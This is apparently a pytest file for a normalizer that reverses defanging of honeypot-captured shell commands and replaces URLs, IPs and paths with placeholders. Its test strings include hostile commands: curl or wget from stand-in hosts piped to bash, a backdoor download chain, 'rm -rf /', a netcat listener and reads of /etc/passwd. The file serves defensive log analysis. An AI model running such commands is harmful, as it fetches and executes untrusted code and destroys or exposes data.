"""Unit tests for DefangingAwareNormalizer."""

from __future__ import annotations

import pytest

from cowrieprocessor.vectorization.defanging_normalizer import DefangingAwareNormalizer


class TestDefangingAwareNormalizer:
    """Test the DefangingAwareNormalizer class."""

    @pytest.fixture
    def normalizer(self) -> DefangingAwareNormalizer:
        """Create a DefangingAwareNormalizer instance for testing."""
        return DefangingAwareNormalizer()

    def test_required_test_cases(self, normalizer: DefangingAwareNormalizer) -> None:
        """Test all required test cases from issue #50."""
        test_cases = [
            ("cxrl hxxp://evil.com", "curl [URL]"),
            ("bxsh script.sh", "bash script.sh"),
            ("rx -rf /", "rm -rf [PATH:1]"),
            ("dx if=/dev/zero", "dd if=[PATH:2]"),
            ("cmd1 [AND] cmd2", "cmd1 && cmd2"),
            ("cmd1 [PIPE] cmd2", "cmd1 | cmd2"),
            ("[SUBSHELL] date [SUBSHELL]", "$(date)"),
            ("[BACKTICK] whoami [BACKTICK]", "`whoami`"),
            ("curl http://evil.com", "curl [URL]"),  # Idempotency
            ("", ""),  # Empty
        ]

        for input_cmd, expected in test_cases:
            result = normalizer.normalize(input_cmd)
            assert result == expected, f"Failed: {input_cmd!r} -> {result!r} (expected {expected!r})"

    def test_reverse_defanging_url_schemes(self, normalizer: DefangingAwareNormalizer) -> None:
        """Test reversal of defanged URL schemes."""
        test_cases = [
            ("hxxp://evil.com", "http://evil.com"),
            ("hxxps://secure.evil.com", "https://secure.evil.com"),
            ("fxp://files.com", "ftp://files.com"),
            ("fxps://secure.files.com", "ftps://secure.files.com"),
            ("sfxp://secure.ftp.com", "sftp://secure.ftp.com"),
            ("fxle://local/path", "file://local/path"),
        ]

        for defanged, expected in test_cases:
            result = normalizer._reverse_defanging(defanged)
            assert result == expected, f"Failed: {defanged!r} -> {result!r} (expected {expected!r})"

    def test_reverse_defanging_commands(self, normalizer: DefangingAwareNormalizer) -> None:
        """Test reversal of defanged command names."""
        test_cases = [
            ("bxsh script.sh", "bash script.sh"),
            ("cxrl http://test.com", "curl http://test.com"),
            ("rx -rf /tmp", "rm -rf /tmp"),
            ("dx if=/dev/zero of=/dev/null", "dd if=/dev/zero of=/dev/null"),
            ("wxgt http://file.com", "wget http://file.com"),
            ("pythxn script.py", "python script.py"),
            ("pythxn3 app.py", "python3 app.py"),
            ("pxrl script.pl", "perl script.pl"),
            ("nx -l 4444", "nc -l 4444"),
            ("nxcat listener", "netcat listener"),
            ("pxwershell script.ps1", "powershell script.ps1"),
            ("cxd /c dir", "cmd /c dir"),
        ]

        for defanged, expected in test_cases:
            result = normalizer._reverse_defanging(defanged)
            assert result == expected, f"Failed: {defanged!r} -> {result!r} (expected {expected!r})"

    def test_reverse_defanging_operators(self, normalizer: DefangingAwareNormalizer) -> None:
        """Test reversal of defanged operators."""
        test_cases = [
            ("cmd1 [AND] cmd2", "cmd1 && cmd2"),
            ("cmd1 [OR] cmd2", "cmd1 || cmd2"),
            ("cmd1 [PIPE] cmd2", "cmd1 | cmd2"),
            ("cmd1[SC] cmd2", "cmd1; cmd2"),  # No space before SC
            ("cmd1 [SC] cmd2", "cmd1 ; cmd2"),  # With space
            ("cmd [APPEND] file.txt", "cmd >> file.txt"),
            ("cmd [OUTPUT] file.txt", "cmd > file.txt"),
            ("cmd [STDERR]", "cmd 2>&1"),
        ]

        for defanged, expected in test_cases:
            result = normalizer._reverse_defanging(defanged)
            assert result == expected, f"Failed: {defanged!r} -> {result!r} (expected {expected!r})"

    def test_reverse_defanging_subshell(self, normalizer: DefangingAwareNormalizer) -> None:
        """Test reversal of subshell markers."""
        test_cases = [
            ("[SUBSHELL] date [SUBSHELL]", "$(date)"),
            ("[SUBSHELL] whoami [SUBSHELL]", "$(whoami)"),
            ("echo [SUBSHELL] uname -a [SUBSHELL]", "echo $(uname -a)"),
            ("[SUBSHELL] cat /etc/passwd [SUBSHELL]", "$(cat /etc/passwd)"),
        ]

        for defanged, expected in test_cases:
            result = normalizer._reverse_defanging(defanged)
            assert result == expected, f"Failed: {defanged!r} -> {result!r} (expected {expected!r})"

    def test_reverse_defanging_backticks(self, normalizer: DefangingAwareNormalizer) -> None:
        """Test reversal of backtick markers."""
        test_cases = [
            ("[BACKTICK] whoami [BACKTICK]", "`whoami`"),
            ("[BACKTICK] date [BACKTICK]", "`date`"),
            ("echo [BACKTICK] hostname [BACKTICK]", "echo `hostname`"),
            ("[BACKTICK] cat file.txt [BACKTICK]", "`cat file.txt`"),
        ]

        for defanged, expected in test_cases:
            result = normalizer._reverse_defanging(defanged)
            assert result == expected, f"Failed: {defanged!r} -> {result!r} (expected {expected!r})"

    def test_reverse_defanging_risk_prefix(self, normalizer: DefangingAwareNormalizer) -> None:
        """Test removal of risk prefix."""
        test_cases = [
            ("[defang:dangerous] rm -rf /", "rm -rf /"),
            ("[defang:moderate] mkdir test", "mkdir test"),
            ("[defang:safe] ls -la", "ls -la"),
            ("[defang:dangerous] cxrl hxxp://evil.com", "curl http://evil.com"),
        ]

        for defanged, expected in test_cases:
            result = normalizer._reverse_defanging(defanged)
            assert result == expected, f"Failed: {defanged!r} -> {result!r} (expected {expected!r})"

    def test_semantic_normalization_urls(self, normalizer: DefangingAwareNormalizer) -> None:
        """Test semantic normalization of URLs."""
        test_cases = [
            ("curl http://evil.com", "curl [URL]"),
            ("wget https://malware.net/payload.sh", "wget [URL]"),
            ("ftp://files.com/data", "[URL]"),
            ("http://192.168.1.1/admin", "[URL]"),
            ("https://evil.com:8080/path", "[URL]"),
        ]

        for input_cmd, expected in test_cases:
            result = normalizer._normalize_semantically(input_cmd)
            assert result == expected, f"Failed: {input_cmd!r} -> {result!r} (expected {expected!r})"

    def test_semantic_normalization_ips(self, normalizer: DefangingAwareNormalizer) -> None:
        """Test semantic normalization of IP addresses."""
        test_cases = [
            ("ping 192.168.1.1", "ping [IP]"),
            ("ssh root@10.0.0.1", "ssh root@[IP]"),
            ("nc 8.8.8.8 53", "nc [IP] 53"),
            ("connect to 172.16.0.1", "connect to [IP]"),
        ]

        for input_cmd, expected in test_cases:
            result = normalizer._normalize_semantically(input_cmd)
            assert result == expected, f"Failed: {input_cmd!r} -> {result!r} (expected {expected!r})"

    def test_semantic_normalization_paths(self, normalizer: DefangingAwareNormalizer) -> None:
        """Test semantic normalization of file paths."""
        test_cases = [
            ("rm -rf /", "rm -rf [PATH:1]"),
            ("rm -rf /tmp", "rm -rf [PATH:1]"),
            ("cat /etc/passwd", "cat [PATH:2]"),
            ("ls /var/log/syslog", "ls [PATH:3]"),
            ("/usr/bin/python", "[PATH:3]"),
            ("dd if=/dev/zero", "dd if=[PATH:2]"),
            ("C:\\Windows\\System32\\cmd.exe", "[PATH:4]"),  # C: + Windows + System32 + cmd.exe
        ]

        for input_cmd, expected in test_cases:
            result = normalizer._normalize_semantically(input_cmd)
            assert result == expected, f"Failed: {input_cmd!r} -> {result!r} (expected {expected!r})"

    def test_idempotency(self, normalizer: DefangingAwareNormalizer) -> None:
        """Test that normalization is idempotent."""
        test_cases = [
            "curl [URL]",
            "ping [IP]",
            "rm -rf [PATH:1]",
            "wget [URL] && bash script.sh",
            "connect [IP] [PATH:2]",
        ]

        for cmd in test_cases:
            # Normalizing an already-normalized command should return unchanged
            result = normalizer.normalize(cmd)
            assert result == cmd, f"Idempotency failed: {cmd!r} -> {result!r}"

            # Double normalization should produce same result
            result2 = normalizer.normalize(result)
            assert result2 == result, f"Double normalization failed: {result!r} -> {result2!r}"

    def test_is_already_normalized(self, normalizer: DefangingAwareNormalizer) -> None:
        """Test detection of already-normalized commands."""
        normalized_commands = [
            "curl [URL]",
            "ping [IP]",
            "rm -rf [PATH:1]",
            "cat [PATH:3]",
            "wget [URL] && [PATH:2]",
        ]

        for cmd in normalized_commands:
            assert normalizer._is_already_normalized(cmd), f"Should be detected as normalized: {cmd!r}"

        unnormalized_commands = [
            "curl http://evil.com",
            "ping 192.168.1.1",
            "rm -rf /tmp",
            "cat /etc/passwd",
            "cxrl hxxp://evil.com",
        ]

        for cmd in unnormalized_commands:
            assert not normalizer._is_already_normalized(cmd), f"Should NOT be detected as normalized: {cmd!r}"

    def test_empty_and_whitespace(self, normalizer: DefangingAwareNormalizer) -> None:
        """Test handling of empty and whitespace-only commands."""
        test_cases = [
            ("", ""),
            ("   ", ""),
            ("\t", ""),
            ("\n", ""),
            ("  \t\n  ", ""),
        ]

        for input_cmd, expected in test_cases:
            result = normalizer.normalize(input_cmd)
            assert result == expected, f"Failed: {input_cmd!r} -> {result!r} (expected {expected!r})"

    def test_complex_command_chains(self, normalizer: DefangingAwareNormalizer) -> None:
        """Test normalization of complex command chains."""
        test_cases = [
            (
                "cxrl hxxp://evil.com [PIPE] bxsh",
                "curl [URL] | bash",
            ),
            (
                "wxgt hxxps://malware.net/payload.sh [AND] bxsh payload.sh",
                "wget [URL] && bash payload.sh",
            ),
            (
                "[SUBSHELL] cxrl hxxp://192.168.1.1/script [SUBSHELL] [PIPE] bxsh",
                "$(curl [URL]) | bash",
            ),
            (
                "rx -rf /tmp/malware [SC] cxrl hxxp://evil.com/new",
                "rm -rf [PATH:2] ; curl [URL]",
            ),
        ]

        for input_cmd, expected in test_cases:
            result = normalizer.normalize(input_cmd)
            assert result == expected, f"Failed: {input_cmd!r} -> {result!r} (expected {expected!r})"

    def test_mixed_normalization(self, normalizer: DefangingAwareNormalizer) -> None:
        """Test commands with mixed defanging and normal elements."""
        test_cases = [
            # Partially defanged
            ("curl hxxp://evil.com", "curl [URL]"),
            ("bxsh /tmp/script.sh", "bash [PATH:2]"),  # tmp + script.sh
            # Multiple elements
            ("cxrl hxxp://192.168.1.1/payload [AND] bxsh /tmp/run.sh", "curl [URL] && bash [PATH:2]"),
            # Nested patterns
            ("[BACKTICK] cxrl hxxp://evil.com [BACKTICK]", "`curl [URL]`"),
        ]

        for input_cmd, expected in test_cases:
            result = normalizer.normalize(input_cmd)
            assert result == expected, f"Failed: {input_cmd!r} -> {result!r} (expected {expected!r})"

    def test_edge_cases(self, normalizer: DefangingAwareNormalizer) -> None:
        """Test edge cases and boundary conditions."""
        test_cases = [
            # Commands without spaces
            ("cxrl", "curl"),
            ("bxsh", "bash"),
            # Multiple spaces
            ("cxrl  hxxp://evil.com", "curl  [URL]"),
            # Leading/trailing whitespace
            ("  cxrl hxxp://evil.com  ", "curl [URL]"),
            # Case sensitivity
            ("CXRL HXXP://EVIL.COM", "curl [URL]"),
            # No defanging needed
            ("ls -la", "ls -la"),
            ("echo hello", "echo hello"),
        ]

        for input_cmd, expected in test_cases:
            result = normalizer.normalize(input_cmd)
            assert result == expected, f"Failed: {input_cmd!r} -> {result!r} (expected {expected!r})"

    def test_path_depth_calculation(self, normalizer: DefangingAwareNormalizer) -> None:
        """Test accurate path depth calculation."""
        test_cases = [
            ("/", "[PATH:1]"),
            ("/tmp", "[PATH:1]"),
            ("/tmp/file", "[PATH:2]"),
            ("/usr/bin", "[PATH:2]"),
            ("/usr/bin/python", "[PATH:3]"),
            ("/var/log/app/error.log", "[PATH:4]"),
            ("C:\\Windows", "[PATH:2]"),  # C: + Windows
            ("C:\\Windows\\System32", "[PATH:3]"),  # C: + Windows + System32
        ]

        for path, expected in test_cases:
            result = normalizer._normalize_semantically(path)
            assert result == expected, f"Failed: {path!r} -> {result!r} (expected {expected!r})"

    def test_word_boundary_preservation(self, normalizer: DefangingAwareNormalizer) -> None:
        """Test that word boundaries are respected during defanging reversal."""
        test_cases = [
            # Should NOT replace 'rx' in 'proxy'
            ("proxy server", "proxy server"),
            # Should replace standalone 'rx'
            ("rx -rf /tmp", "rm -rf [PATH:1]"),
            # Should NOT replace 'dx' in 'index'
            ("index.html", "index.html"),
            # Should replace standalone 'dx'
            ("dx if=/dev/zero", "dd if=[PATH:2]"),
        ]

        for input_cmd, expected in test_cases:
            result = normalizer.normalize(input_cmd)
            assert result == expected, f"Failed: {input_cmd!r} -> {result!r} (expected {expected!r})"

    def test_full_pipeline_integration(self, normalizer: DefangingAwareNormalizer) -> None:
        """Test complete normalization pipeline with realistic malware commands."""
        test_cases = [
            # Typical malware download
            (
                "[defang:dangerous] cxrl hxxp://evil.com/malware.sh [PIPE] bxsh",
                "curl [URL] | bash",
            ),
            # File manipulation chain
            (
                "rx -rf /tmp/old [AND] wxgt hxxps://new.com/backdoor [AND] bxsh backdoor",
                "rm -rf [PATH:2] && wget [URL] && bash backdoor",
            ),
            # Command substitution
            (
                "var=[SUBSHELL] cxrl hxxp://192.168.1.100/config [SUBSHELL]",
                "var=$(curl [URL])",
            ),
            # Backtick execution
            (
                "result=[BACKTICK] wxgt hxxp://server.com/data [BACKTICK]",
                "result=`wget [URL]`",
            ),
        ]

        for input_cmd, expected in test_cases:
            result = normalizer.normalize(input_cmd)
            assert result == expected, f"Failed: {input_cmd!r} -> {result!r} (expected {expected!r})"
